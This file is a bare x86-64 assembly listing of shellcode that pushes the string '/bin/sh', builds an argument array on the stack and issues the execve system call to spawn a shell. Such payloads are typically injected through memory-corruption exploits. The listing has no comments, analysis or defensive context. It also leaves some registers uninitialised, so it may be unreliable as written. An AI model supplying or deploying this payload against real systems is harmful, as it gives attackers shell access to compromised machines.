    BITS 64
    xor    rsi,rsi
    push   rsi
    mov rdi, 0x68732f6e69622f
    push   rdi
    push   rsp
    pop    rdi

    push  0
    push  rdi
    push  rsp
    pop   rsi

    mov al, 0x3b
	syscall
